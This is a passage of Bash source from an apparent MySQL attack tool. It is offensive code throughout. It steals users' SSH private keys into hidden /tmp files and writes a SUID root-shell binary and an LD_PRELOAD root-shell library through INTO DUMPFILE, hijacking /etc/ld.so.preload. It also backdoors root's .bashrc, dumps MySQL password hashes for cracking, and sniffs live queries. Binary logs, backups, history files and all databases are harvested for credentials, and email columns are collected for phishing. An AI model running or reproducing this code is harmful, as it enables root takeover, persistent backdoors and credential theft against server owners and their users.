                    log_critical "SSH KEY for ${uname}: ${home}/.ssh/${keyfile}"
                    echo "$key_content" > "/tmp/.stolen_key_${uname}"
                    chmod 600 "/tmp/.stolen_key_${uname}"
                    echo "SSH KEY: ${uname} -> ${home}/.ssh/${keyfile}" >> "$REPORT_FILE"
                    files_read=$((files_read + 1))
                fi
            done
        fi
    done < /etc/passwd

    # Cleanup
    $mysql_cmd -e "DROP DATABASE IF EXISTS _privesc_temp;" 2>/dev/null

    log_info "Total sensitive files read: $files_read"
    echo "Files read total: $files_read" >> "$REPORT_FILE"

    if [ $files_read -gt 0 ]; then
        return 0
    fi

    return 1
}

# INTO DUMPFILE - Binary file write exploitation
try_mysql_dumpfile_exploit() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  INTO DUMPFILE - BINARY FILE WRITE"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== INTO DUMPFILE EXPLOITATION ===" >> "$REPORT_FILE"

    # Check secure_file_priv
    local sfp=$($mysql_cmd -N -e "SELECT @@secure_file_priv;" 2>/dev/null)

    if [ "$sfp" == "NULL" ]; then
        log_error "secure_file_priv is NULL - INTO DUMPFILE disabled"
        return 1
    elif [ -n "$sfp" ] && [ "$sfp" != "" ]; then
        log_warning "secure_file_priv restricted to: $sfp"
        log_info "DUMPFILE can only write to: $sfp"
    else
        log_success "secure_file_priv is empty - DUMPFILE can write anywhere!"
    fi

    # --- Method 1: Compile and write SUID binary via DUMPFILE ---
    log_exploit "[DUMPFILE M1] Writing SUID binary..."

    if command -v gcc &>/dev/null; then
        cat > /tmp/.suid_helper.c << 'SUIDEOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    char *args[] = {"/bin/bash", "-p", NULL};
    execve("/bin/bash", args, NULL);
    return 1;
}
SUIDEOF
        gcc -static -o /tmp/.suid_helper /tmp/.suid_helper.c 2>/dev/null || \
        gcc -o /tmp/.suid_helper /tmp/.suid_helper.c 2>/dev/null

        if [ -f /tmp/.suid_helper ]; then
            if command -v xxd &>/dev/null; then
                local hex_binary=$(xxd -p /tmp/.suid_helper | tr -d '\n')

                $mysql_cmd -e "SELECT UNHEX('${hex_binary}') INTO DUMPFILE '/tmp/.mysql_suid_shell';" 2>/dev/null

                if [ -f /tmp/.mysql_suid_shell ]; then
                    chmod +x /tmp/.mysql_suid_shell 2>/dev/null
                    log_success "SUID binary written via DUMPFILE"
                    log_info "File owner: $(ls -la /tmp/.mysql_suid_shell 2>/dev/null)"

                    if [ "$MYSQL_PROCESS_USER" == "root" ]; then
                        log_critical "Binary owned by root - attempting SUID via UDF..."
                        $mysql_cmd -e "SELECT sys_exec('chmod u+s /tmp/.mysql_suid_shell');" 2>/dev/null

                        if [ -u /tmp/.mysql_suid_shell ]; then
                            log_exploit "SUID binary ready!"
                            /tmp/.mysql_suid_shell

                            if [ "$(id -u)" -eq 0 ]; then
                                SUCCESS=1
                                ESCALATION_METHOD="INTO DUMPFILE: SUID binary"
                                TARGET_USER="root"
                                return 0
                            fi
                        fi
                    fi
                fi
            else
                log_warning "xxd not found - cannot hex-encode binary"
            fi
        fi

        rm -f /tmp/.suid_helper.c /tmp/.suid_helper 2>/dev/null
    fi

    # --- Method 2: Write LD_PRELOAD shared library via DUMPFILE ---
    log_exploit "[DUMPFILE M2] Writing LD_PRELOAD library..."

    if command -v gcc &>/dev/null; then
        cat > /tmp/.preload_lib.c << 'PRELOADEOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
PRELOADEOF

        gcc -fPIC -shared -nostartfiles -o /tmp/.preload_evil.so /tmp/.preload_lib.c 2>/dev/null

        if [ -f /tmp/.preload_evil.so ]; then
            if command -v xxd &>/dev/null; then
                local hex_so=$(xxd -p /tmp/.preload_evil.so | tr -d '\n')

                $mysql_cmd -e "SELECT UNHEX('${hex_so}') INTO DUMPFILE '/tmp/.evil_preload.so';" 2>/dev/null

                if [ -f /tmp/.evil_preload.so ]; then
                    log_success "LD_PRELOAD library written via DUMPFILE"

                    if [ "$MYSQL_PROCESS_USER" == "root" ]; then
                        # Write to /etc/ld.so.preload
                        $mysql_cmd -e "SELECT '/tmp/.evil_preload.so' INTO OUTFILE '/etc/ld.so.preload';" 2>/dev/null

                        if [ -f /etc/ld.so.preload ]; then
                            log_exploit "ld.so.preload written!"
                            log_critical "All SUID binaries will load our library"
                            log_info "Triggering via SUID binary..."

                            /usr/bin/su --help 2>/dev/null

                            if [ "$(id -u)" -eq 0 ]; then
                                SUCCESS=1
                                ESCALATION_METHOD="DUMPFILE + LD_PRELOAD: root shell"
                                TARGET_USER="root"
                                return 0
                            fi
                        fi
                    else
                        log_info "Library at /tmp/.evil_preload.so"
                        log_info "Manual: LD_PRELOAD=/tmp/.evil_preload.so <suid_binary>"
                    fi
                fi
            fi
        fi

        rm -f /tmp/.preload_lib.c 2>/dev/null
    fi

    # --- Method 3: Write malicious .bashrc for target user ---
    log_exploit "[DUMPFILE M3] Writing backdoored .bashrc..."

    if [ "$MYSQL_PROCESS_USER" == "root" ]; then
        local bashrc_payload='cp /bin/bash /tmp/.bash_suid && chmod u+s /tmp/.bash_suid'
        $mysql_cmd -e "SELECT '${bashrc_payload}' INTO DUMPFILE '/root/.bashrc.d/mysql_backdoor';" 2>/dev/null

        if [ $? -eq 0 ]; then
            log_exploit "Backdoor .bashrc written for root"
            log_info "Will execute next time root opens a bash session"
        fi
    fi

    log_warning "DUMPFILE exploitation completed"
    return 1
}

# MySQL CLI Shell Escape Detection
# Checks if direct shell access is possible through MySQL client
try_mysql_cli_shell_escape() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  MYSQL CLI SHELL ESCAPE DETECTION"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== MYSQL CLI SHELL ESCAPE ===" >> "$REPORT_FILE"

    # Check if \! (system) command works
    local cli_test=$($mysql_cmd -e "\! id" 2>/dev/null)

    if [ -n "$cli_test" ]; then
        log_exploit "MySQL CLI shell escape works!"
        log_success "\\! id = $cli_test"
        echo "CLI Shell Escape: WORKS" >> "$REPORT_FILE"
        echo "CLI id output: $cli_test" >> "$REPORT_FILE"

        if echo "$cli_test" | grep -q "uid=0"; then
            log_critical "CLI shell running as ROOT!"
            log_exploit "Direct root shell via: mysql -u root -e '\\! /bin/bash'"
            SUCCESS=1
            ESCALATION_METHOD="MySQL CLI \\! shell escape"
            TARGET_USER="root"
        else
            log_info "CLI shell running as: $cli_test"
            log_info "Shell as MySQL process user: $MYSQL_PROCESS_USER"
        fi
    else
        log_info "CLI shell escape not available or returned empty"
    fi

    # Check if system() UDF-like built-in exists
    local sys_test=$($mysql_cmd -N -e "SELECT sys_exec('id');" 2>/dev/null)
    if [ -n "$sys_test" ]; then
        log_exploit "sys_exec() function available! (possibly pre-loaded UDF)"
    fi

    echo ""
}

# MySQL Password Hash Extraction
# Dump MySQL user password hashes for offline cracking
try_mysql_hash_dump() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  MYSQL PASSWORD HASH EXTRACTION"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== MYSQL HASH DUMP ===" >> "$REPORT_FILE"

    # Try mysql.user table (MySQL 5.x and MariaDB)
    local user_hashes=$($mysql_cmd -N -e "SELECT User, Host, Password FROM mysql.user WHERE Password != '' AND Password IS NOT NULL;" 2>/dev/null)

    if [ -z "$user_hashes" ]; then
        # MySQL 5.7+ uses authentication_string
        user_hashes=$($mysql_cmd -N -e "SELECT User, Host, authentication_string FROM mysql.user WHERE authentication_string != '' AND authentication_string IS NOT NULL;" 2>/dev/null)
    fi

    if [ -n "$user_hashes" ]; then
        log_critical "MySQL user password hashes extracted!"
        echo "$user_hashes" | while IFS=$'\t' read -r user host hash; do
            log_success "  $user@$host : $hash"
            echo "MYSQL_HASH: $user@$host = $hash" >> "$REPORT_FILE"
            echo "$user:$hash" >> /tmp/.mysql_hashes
        done

        log_info "Hashes saved: /tmp/.mysql_hashes"
        log_info "Crack with: hashcat -m 300 /tmp/.mysql_hashes (MySQL4/5)"
        log_info "         or hashcat -m 7401 /tmp/.mysql_hashes (MySQL >= 5.7 sha256)"

        # Try password reuse against system accounts
        log_info "Checking for password reuse against system accounts..."
        if [ -s /tmp/.mysql_hashes ]; then
            while IFS=: read -r muser mhash; do
                if id "$muser" &>/dev/null; then
                    log_warning "MySQL user '$muser' exists as system user - possible password reuse"
                fi
            done < /tmp/.mysql_hashes
        fi
    else
        log_warning "Cannot read mysql.user table"
    fi

    # Dump all databases for enumeration
    log_info "Enumerating databases..."
    local all_dbs=$($mysql_cmd -N -e "SHOW DATABASES;" 2>/dev/null)
    if [ -n "$all_dbs" ]; then
        echo "$all_dbs" | while read db; do
            log_info "  Database: $db"
        done
        echo "DATABASES: $all_dbs" >> "$REPORT_FILE"
    fi

    echo ""
}

# ═══════════════════════════════════════════════════════════════
# INFORMATION DISCLOSURE - ADVANCED METHODS
# ═══════════════════════════════════════════════════════════════

# SHOW PROCESSLIST - Sniff queries from other users/sessions
try_processlist_sniff() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  PROCESSLIST SNIFFING"
    log_exploit "  Capture live queries from other sessions"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== PROCESSLIST SNIFFING ===" >> "$REPORT_FILE"

    local has_process=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "PROCESS|ALL PRIVILEGES|SUPER")
    if [ -z "$has_process" ]; then
        log_warning "PROCESS privilege required - not available"
        log_info "Can only see own threads without PROCESS privilege"
    fi

    log_info "Capturing SHOW FULL PROCESSLIST..."

    local proc_list=$($mysql_cmd -N -e "SHOW FULL PROCESSLIST;" 2>/dev/null)

    if [ -n "$proc_list" ]; then
        log_success "Active processes captured!"
        echo "$proc_list" | while IFS=$'\t' read -r id user host db command time state info; do
            if [ -n "$info" ] && [ "$info" != "NULL" ] && [ "$info" != "SHOW FULL PROCESSLIST" ]; then
                log_info "  [$user@$host] DB=$db | $info"

                if echo "$info" | grep -iE "password|passwd|secret|token|INSERT INTO.*user" &>/dev/null; then
                    log_critical "CREDENTIAL LEAK in query from $user@$host:"
                    log_exploit "  $info"
                    echo "PROCESSLIST LEAK [$user@$host]: $info" >> "$REPORT_FILE"
                fi
            fi
        done
    fi

    # Continuous sniffing (capture 5 snapshots with 2s interval)
    log_info "Sniffing processlist (5 captures, 2s interval)..."

    for i in $(seq 1 5); do
        local snapshot=$($mysql_cmd -N -e "SHOW FULL PROCESSLIST;" 2>/dev/null)
        if [ -n "$snapshot" ]; then
            echo "$snapshot" | grep -viE "SHOW FULL PROCESSLIST|Sleep|NULL" | while IFS=$'\t' read -r id user host db command time state info; do
                if [ -n "$info" ] && [ "$info" != "NULL" ]; then
                    if echo "$info" | grep -iE "password|passwd|secret|key|token|auth|login|credential|INSERT|UPDATE.*SET" &>/dev/null; then
                        log_critical "[Capture $i] Interesting query from $user: $info"
                        echo "SNIFF[$i] $user: $info" >> "$REPORT_FILE"
                    fi
                fi
            done
        fi
        sleep 2
    done

    # Check for long-running queries that might expose info
    local long_queries=$($mysql_cmd -N -e "SELECT user, host, time, info FROM information_schema.processlist WHERE time > 5 AND info IS NOT NULL AND info != '';" 2>/dev/null)
    if [ -n "$long_queries" ]; then
        log_success "Long-running queries found:"
        echo "$long_queries" | while read line; do
            log_info "  $line"
        done
        echo "LONG QUERIES: $long_queries" >> "$REPORT_FILE"
    fi

    echo ""
}

# Binary Log Extraction - Read binlog for leaked credentials
try_binlog_extraction() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  BINARY LOG EXTRACTION"
    log_exploit "  Read binlog for historical credentials"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== BINARY LOG EXTRACTION ===" >> "$REPORT_FILE"

    # Check if binlog is enabled
    local log_bin=$($mysql_cmd -N -e "SELECT @@log_bin;" 2>/dev/null)
    local binlog_format=$($mysql_cmd -N -e "SELECT @@binlog_format;" 2>/dev/null)

    log_info "Binary logging: $log_bin (format: $binlog_format)"

    if [ "$log_bin" != "1" ] && [ "$log_bin" != "ON" ]; then
        log_info "Binary logging is disabled"
        return 1
    fi

    # List available binary logs
    local binlogs=$($mysql_cmd -N -e "SHOW BINARY LOGS;" 2>/dev/null)

    if [ -z "$binlogs" ]; then
        log_warning "Cannot list binary logs (insufficient privileges or none exist)"
        return 1
    fi

    log_success "Binary logs found:"
    echo "$binlogs" | while IFS=$'\t' read -r logname size encrypted; do
        log_info "  $logname (${size} bytes)"
    done

    # Read binlog events and search for credentials
    local latest_binlog=$(echo "$binlogs" | tail -1 | awk '{print $1}')

    if [ -n "$latest_binlog" ]; then
        log_info "Reading events from: $latest_binlog"

        local events=$($mysql_cmd -N -e "SHOW BINLOG EVENTS IN '${latest_binlog}' LIMIT 500;" 2>/dev/null)

        if [ -n "$events" ]; then
            local cred_events=$(echo "$events" | grep -iE "password|passwd|secret|token|CREATE USER|ALTER USER|GRANT|SET PASSWORD|IDENTIFIED BY")

            if [ -n "$cred_events" ]; then
                log_critical "Credential-related events found in binlog!"
                echo "$cred_events" | while read event_line; do
                    log_exploit "  $event_line"
                    echo "BINLOG CRED: $event_line" >> "$REPORT_FILE"
                done
            fi

            local insert_events=$(echo "$events" | grep -iE "INSERT INTO.*user|INSERT INTO.*account|INSERT INTO.*admin|INSERT INTO.*login")

            if [ -n "$insert_events" ]; then
                log_critical "User/account INSERT events found in binlog!"
                echo "$insert_events" | head -20 | while read event_line; do
                    log_success "  $event_line"
                    echo "BINLOG INSERT: $event_line" >> "$REPORT_FILE"
                done
            fi
        fi

        # Try reading all binlogs for credential events
        echo "$binlogs" | awk '{print $1}' | while read blog; do
            local blog_creds=$($mysql_cmd -N -e "SHOW BINLOG EVENTS IN '${blog}';" 2>/dev/null | grep -iE "IDENTIFIED BY|SET PASSWORD|CREATE USER|ALTER USER" | head -10)
            if [ -n "$blog_creds" ]; then
                log_critical "Credentials in $blog:"
                echo "$blog_creds" | while read cline; do
                    log_exploit "  $cline"
                    echo "BINLOG[$blog]: $cline" >> "$REPORT_FILE"
                done
            fi
        done
    fi

    # Check relay logs too
    local relay_log=$($mysql_cmd -N -e "SELECT @@relay_log;" 2>/dev/null)
    if [ -n "$relay_log" ] && [ "$relay_log" != "NULL" ]; then
        log_info "Relay log configured: $relay_log (replication setup detected)"
        echo "RELAY LOG: $relay_log" >> "$REPORT_FILE"

        local slave_status=$($mysql_cmd -N -e "SHOW SLAVE STATUS\G" 2>/dev/null)
        if [ -n "$slave_status" ]; then
            local master_user=$(echo "$slave_status" | grep "Master_User" | awk '{print $2}')
            local master_host=$(echo "$slave_status" | grep "Master_Host" | awk '{print $2}')
            if [ -n "$master_user" ]; then
                log_critical "Replication master: $master_user@$master_host"
                echo "REPLICATION: $master_user@$master_host" >> "$REPORT_FILE"
            fi
        fi
    fi

    echo ""
}

# INFORMATION_SCHEMA Enumeration - Find credential columns across all databases
try_information_schema_enum() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  INFORMATION_SCHEMA ENUMERATION"
    log_exploit "  Find credential data across all databases"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== INFORMATION_SCHEMA ENUMERATION ===" >> "$REPORT_FILE"

    # Find tables with credential-like column names
    log_info "Searching for tables with credential columns..."

    local cred_columns=$($mysql_cmd -N -e "
        SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
        FROM information_schema.COLUMNS
        WHERE COLUMN_NAME REGEXP 'passw|passwd|password|secret|token|api_key|apikey|auth|credential|hash|salt|session|cookie|jwt|access_key|private_key|secret_key'
        AND TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys')
        ORDER BY TABLE_SCHEMA, TABLE_NAME;" 2>/dev/null)

    if [ -n "$cred_columns" ]; then
        log_critical "Tables with credential columns found!"
        echo "$cred_columns" | while IFS=$'\t' read -r schema table column; do
            log_success "  $schema.$table -> $column"
            echo "CRED_COLUMN: $schema.$table.$column" >> "$REPORT_FILE"
        done

        # Extract actual data from credential tables
        log_info "Extracting data from credential tables..."

        echo "$cred_columns" | while IFS=$'\t' read -r schema table column; do
            # Find username-like column in the same table
            local user_col=$($mysql_cmd -N -e "
                SELECT COLUMN_NAME FROM information_schema.COLUMNS
                WHERE TABLE_SCHEMA='${schema}' AND TABLE_NAME='${table}'
                AND COLUMN_NAME REGEXP 'user|username|login|email|name|account|admin'
                LIMIT 1;" 2>/dev/null)

            local query=""
            if [ -n "$user_col" ]; then
                query="SELECT ${user_col}, ${column} FROM \`${schema}\`.\`${table}\` LIMIT 20;"
            else
                query="SELECT ${column} FROM \`${schema}\`.\`${table}\` LIMIT 20;"
            fi

            local cred_data=$($mysql_cmd -N -e "$query" 2>/dev/null)

            if [ -n "$cred_data" ]; then
                log_critical "Data from $schema.$table:"
                echo "$cred_data" | head -10 | while read dline; do
                    log_exploit "  $dline"
                    echo "CRED_DATA[$schema.$table]: $dline" >> "$REPORT_FILE"
                done

                echo "$cred_data" >> /tmp/.extracted_creds_$$
            fi
        done

        if [ -s /tmp/.extracted_creds_$$ ]; then
            log_success "Extracted credentials saved: /tmp/.extracted_creds_$$"
        fi
    else
        log_info "No credential columns found in user databases"
    fi

    # Find tables with email addresses (for phishing/reuse)
    log_info "Searching for email columns..."

    local email_columns=$($mysql_cmd -N -e "
        SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
        FROM information_schema.COLUMNS
        WHERE COLUMN_NAME REGEXP 'email|mail|e_mail'
        AND TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys')
        LIMIT 20;" 2>/dev/null)

    if [ -n "$email_columns" ]; then
        log_success "Email columns found:"
        echo "$email_columns" | while IFS=$'\t' read -r schema table column; do
            log_info "  $schema.$table -> $column"
            echo "EMAIL_COLUMN: $schema.$table.$column" >> "$REPORT_FILE"
        done
    fi

    # Count total tables across all databases
    local total_tables=$($mysql_cmd -N -e "
        SELECT COUNT(*) FROM information_schema.TABLES
        WHERE TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys');" 2>/dev/null)

    log_info "Total user tables across all databases: $total_tables"
    echo "Total user tables: $total_tables" >> "$REPORT_FILE"

    # Enumerate all table sizes (find large tables that may contain data)
    local large_tables=$($mysql_cmd -N -e "
        SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_ROWS, ROUND(DATA_LENGTH/1024/1024, 2) as size_mb
        FROM information_schema.TABLES
        WHERE TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys')
        AND TABLE_ROWS > 0
        ORDER BY TABLE_ROWS DESC LIMIT 20;" 2>/dev/null)

    if [ -n "$large_tables" ]; then
        log_info "Largest tables (by row count):"
        echo "$large_tables" | while IFS=$'\t' read -r schema table rows size; do
            log_info "  $schema.$table: $rows rows ($size MB)"
        done
    fi

    echo ""
}

# Backup File Scanner - Find .sql, .bak, database dumps on filesystem
try_backup_file_scan() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  BACKUP FILE SCANNER"
    log_exploit "  Find database dumps & backup files"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== BACKUP FILE SCAN ===" >> "$REPORT_FILE"

    local backup_count=0

    # Search common backup locations
    local search_dirs=("/tmp" "/var/backups" "/var/lib/mysql" "/opt" "/home" "/root"
                       "/var/www" "/srv" "/usr/local" "/var/tmp" "/backup" "/backups"
                       "/data" "/mnt" "/media")

    local backup_patterns=("-name *.sql" "-name *.sql.gz" "-name *.sql.bz2"
                          "-name *.sql.xz" "-name *.sql.zip" "-name *.bak"
                          "-name *.dump" "-name *.db" "-name *.sqlite"
                          "-name *.sqlite3" "-name *.tar.gz" "-name *.tgz"
                          "-name *.sql.old" "-name *.mysql" "-name *.mysqldump"
                          "-name *backup*sql*" "-name *dump*sql*")

    log_info "Scanning filesystem for backup files..."

    for search_dir in "${search_dirs[@]}"; do
        if [ ! -d "$search_dir" ]; then
            continue
        fi

        local found_files=$(find "$search_dir" -maxdepth 4 \
            \( -name "*.sql" -o -name "*.sql.gz" -o -name "*.sql.bz2" \
               -o -name "*.sql.xz" -o -name "*.sql.zip" -o -name "*.bak" \
               -o -name "*.dump" -o -name "*.mysqldump" -o -name "*.sql.old" \
               -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.db" \) \
            -readable 2>/dev/null | head -30)

        if [ -n "$found_files" ]; then
            echo "$found_files" | while read bfile; do
                local fsize=$(stat -c %s "$bfile" 2>/dev/null || echo "unknown")
                local fowner=$(stat -c %U "$bfile" 2>/dev/null || echo "unknown")
                log_success "BACKUP: $bfile ($fsize bytes, owner: $fowner)"
                echo "BACKUP: $bfile ($fsize bytes, $fowner)" >> "$REPORT_FILE"
                backup_count=$((backup_count + 1))

                # Try to extract credentials from SQL dumps
                if [[ "$bfile" == *.sql ]] && [ -r "$bfile" ]; then
                    local sql_creds=$(grep -iE "INSERT INTO.*(user|admin|account|login).*VALUES|password|passwd|secret" "$bfile" 2>/dev/null | head -10)
                    if [ -n "$sql_creds" ]; then
                        log_critical "Credentials found in $bfile:"
                        echo "$sql_creds" | head -5 | while read cline; do
                            log_exploit "  $cline"
                            echo "BACKUP_CRED[$bfile]: $cline" >> "$REPORT_FILE"
                        done
                    fi

                    local sql_grants=$(grep -iE "^GRANT|IDENTIFIED BY" "$bfile" 2>/dev/null | head -10)
                    if [ -n "$sql_grants" ]; then
                        log_critical "GRANT statements in $bfile:"
                        echo "$sql_grants" | while read gline; do
                            log_exploit "  $gline"
                            echo "BACKUP_GRANT[$bfile]: $gline" >> "$REPORT_FILE"
                        done
                    fi
                fi

                # Compressed files - just report them
                if echo "$bfile" | grep -qE "\.(gz|bz2|xz|zip)$"; then
                    log_info "  Compressed backup - manual extraction needed: $bfile"
                fi
            done
        fi
    done

    # Try to read backup files via LOAD_FILE (if they exist in known locations)
    log_info "Trying to read backup files via LOAD_FILE..."

    local common_backup_paths=(
        "/var/backups/mysql.sql"
        "/tmp/backup.sql"
        "/tmp/dump.sql"
        "/var/lib/mysql/backup.sql"
        "/root/backup.sql"
        "/root/dump.sql"
    )

    for bp in "${common_backup_paths[@]}"; do
        local bp_content=$($mysql_cmd -N -e "SELECT LENGTH(LOAD_FILE('${bp}'));" 2>/dev/null)
        if [ -n "$bp_content" ] && [ "$bp_content" != "NULL" ] && [ "$bp_content" -gt 0 ] 2>/dev/null; then
            log_critical "Backup readable via LOAD_FILE: $bp ($bp_content bytes)"
            echo "LOADFILE_BACKUP: $bp ($bp_content bytes)" >> "$REPORT_FILE"

            local bp_head=$($mysql_cmd -N -e "SELECT LEFT(LOAD_FILE('${bp}'), 2000);" 2>/dev/null)
            if echo "$bp_head" | grep -iE "password|IDENTIFIED BY|secret" &>/dev/null; then
                log_exploit "Credentials detected in backup header!"
            fi
        fi
    done

    # Check MySQL data directory for stale .frm/.ibd files
    local datadir=$($mysql_cmd -N -e "SELECT @@datadir;" 2>/dev/null)
    if [ -n "$datadir" ] && [ -d "$datadir" ]; then
        local orphan_files=$(find "$datadir" -name "*.frm" -o -name "*.ibd" -o -name "*.MYD" 2>/dev/null | head -20)
        if [ -n "$orphan_files" ]; then
            log_info "MySQL data files in $datadir:"
            echo "$orphan_files" | while read df; do
                log_info "  $df"
            done
        fi
    fi

    log_info "Backup scan completed"
    echo ""
}

# MySQL Global Variables - Extract credentials from server variables
try_mysql_variables_dump() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  MYSQL GLOBAL VARIABLES DUMP"
    log_exploit "  Extract credentials from server config"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== MYSQL VARIABLES DUMP ===" >> "$REPORT_FILE"

    # Dump all variables that might contain credentials or sensitive info
    local all_vars=$($mysql_cmd -N -e "SHOW GLOBAL VARIABLES;" 2>/dev/null)

    if [ -z "$all_vars" ]; then
        log_warning "Cannot dump global variables"
        return 1
    fi

    # Search for credential-related variables
    local sensitive_vars=$(echo "$all_vars" | grep -iE "password|passwd|secret|key|token|auth|credential|ssl|tls|bind|socket|pid|tmpdir|log")

    if [ -n "$sensitive_vars" ]; then
        log_success "Sensitive variables found:"
        echo "$sensitive_vars" | while IFS=$'\t' read -r varname varval; do
            if echo "$varname" | grep -iE "password|secret|key|token|auth" &>/dev/null; then
                if [ -n "$varval" ] && [ "$varval" != "" ]; then
                    log_critical "  $varname = $varval"
                    echo "SENSITIVE_VAR: $varname = $varval" >> "$REPORT_FILE"
                else
                    log_info "  $varname = (empty)"
                fi
            else
                log_info "  $varname = $varval"
            fi
        done
    fi

    # Check specific high-value variables
    local important_vars=(
        "init_connect"
        "init_slave"
        "init_file"
        "report_password"
        "default_authentication_plugin"
        "validate_password_policy"
        "have_ssl"
        "have_openssl"
        "ssl_ca"
        "ssl_cert"
        "ssl_key"
        "bind_address"
        "skip_networking"
        "skip_grant_tables"
        "local_infile"
        "allow_suspicious_udfs"
        "old_passwords"
        "symbolic_links"
        "log_raw"
    )

    log_info "Checking high-value variables..."

    for var in "${important_vars[@]}"; do
        local val=$($mysql_cmd -N -e "SELECT @@${var};" 2>/dev/null)
        if [ -n "$val" ] && [ "$val" != "NULL" ]; then
            case "$var" in
                "init_connect"|"init_slave"|"init_file")
                    if [ -n "$val" ] && [ "$val" != "" ]; then
                        log_critical "  $var = $val (auto-executed SQL!)"
                        echo "AUTO_EXEC: $var = $val" >> "$REPORT_FILE"
                    fi
                    ;;
                "report_password")
                    if [ -n "$val" ] && [ "$val" != "" ]; then
                        log_critical "  $var = $val (replication password exposed!)"
                        echo "REPL_PASS: $val" >> "$REPORT_FILE"
                    fi
                    ;;
                "skip_grant_tables")
                    if [ "$val" == "ON" ] || [ "$val" == "1" ]; then
                        log_critical "  $var = $val (AUTHENTICATION DISABLED!)"
                    fi
                    ;;
                "local_infile")
                    if [ "$val" == "ON" ] || [ "$val" == "1" ]; then
                        log_warning "  $var = $val (LOAD DATA LOCAL INFILE enabled)"
                    fi
                    ;;
                "log_raw")
                    if [ "$val" == "ON" ] || [ "$val" == "1" ]; then
                        log_critical "  $var = $val (passwords logged in plaintext!)"
                    fi
                    ;;
                *)
                    log_info "  $var = $val"
                    ;;
            esac
            echo "VAR: $var = $val" >> "$REPORT_FILE"
        fi
    done

    # Check for init_connect injection potential (runs for every new connection)
    local init_connect=$($mysql_cmd -N -e "SELECT @@init_connect;" 2>/dev/null)
    if [ -z "$init_connect" ] || [ "$init_connect" == "" ]; then
        log_warning "init_connect is empty - could be set to capture credentials"
        log_info "Example: SET GLOBAL init_connect='INSERT INTO mysql.general_log_backup SELECT USER(), CURRENT_USER(), NOW()'"
    fi

    echo ""
}

# History File Scanner - Read .bash_history, .mysql_history for all users
try_history_file_scan() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  HISTORY FILE SCANNER"
    log_exploit "  Read shell/mysql history for credentials"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== HISTORY FILE SCAN ===" >> "$REPORT_FILE"

    local creds_found=0

    # Scan all users' history files
    while IFS=: read -r uname x uid gid gecos home shell; do
        if [ -z "$home" ] || [ "$home" == "/" ]; then
            continue
        fi

        local history_files=(
            "${home}/.bash_history"
            "${home}/.mysql_history"
            "${home}/.sh_history"
            "${home}/.zsh_history"
            "${home}/.psql_history"
            "${home}/.python_history"
            "${home}/.node_repl_history"
            "${home}/.rediscli_history"
        )

        for hfile in "${history_files[@]}"; do
            # Try reading directly first
            local content=""
            if [ -r "$hfile" ]; then
                content=$(cat "$hfile" 2>/dev/null)
            fi

            # Try via LOAD_FILE if direct read fails
            if [ -z "$content" ] && [ -n "$mysql_cmd" ]; then
                content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${hfile}');" 2>/dev/null)
                if [ "$content" == "NULL" ]; then
                    content=""
                fi
            fi

            if [ -n "$content" ]; then
                log_success "READ: $hfile (user: $uname)"

                # Search for credential patterns
                local cred_lines=$(echo "$content" | grep -inE "mysql.*-p|mysql.*password|passwd|sshpass|curl.*-u |wget.*--password|ftp://.*:.*@|ssh.*@|su -|sudo |htpasswd|openssl passwd|IDENTIFIED BY|SET PASSWORD|GRANT.*TO|echo.*>.*shadow|echo.*>.*passwd|credentials|api.key|api_key|apikey|token=|secret=" 2>/dev/null)

                if [ -n "$cred_lines" ]; then
                    log_critical "Credentials in $hfile:"
                    echo "$cred_lines" | head -20 | while read cline; do
                        log_exploit "  $cline"
                        echo "HISTORY[$uname/$hfile]: $cline" >> "$REPORT_FILE"
                    done
                    creds_found=1
                fi

                # MySQL specific: look for -p followed by password
                local mysql_pass_lines=$(echo "$content" | grep -E "mysql.*-p[^ ]" 2>/dev/null)
                if [ -n "$mysql_pass_lines" ]; then
                    log_critical "MySQL passwords in $hfile:"
                    echo "$mysql_pass_lines" | head -10 | while read mpline; do
                        log_exploit "  $mpline"
                        echo "MYSQL_HISTORY_PASS[$uname]: $mpline" >> "$REPORT_FILE"
                    done
                    creds_found=1
                fi

                # SSH/SCP with password patterns
                local ssh_lines=$(echo "$content" | grep -E "sshpass|ssh.*-i |scp.*-i " 2>/dev/null)
                if [ -n "$ssh_lines" ]; then
                    log_success "SSH commands in $hfile:"
                    echo "$ssh_lines" | head -10 | while read sline; do
                        log_info "  $sline"
                    done
                fi
            fi
        done
    done < /etc/passwd

    if [ $creds_found -eq 1 ]; then
        log_success "Credential-containing history files found"
    else
        log_info "No credentials found in history files"
    fi

    echo ""
}

